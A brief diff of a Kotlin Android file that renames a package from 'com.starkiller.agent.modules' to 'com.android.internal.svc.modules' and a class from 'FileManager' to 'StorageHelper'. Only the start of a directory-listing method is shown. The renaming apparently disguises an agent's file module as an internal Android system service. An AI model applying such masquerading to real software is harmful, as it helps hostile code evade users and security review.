@@ -1,11 +1,11 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.content.Context
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
 
-class FileManager(private val context: Context) {
+class StorageHelper(private val context: Context) {
 
     fun listDir(path: String): JSONObject {
         val dir = File(path)
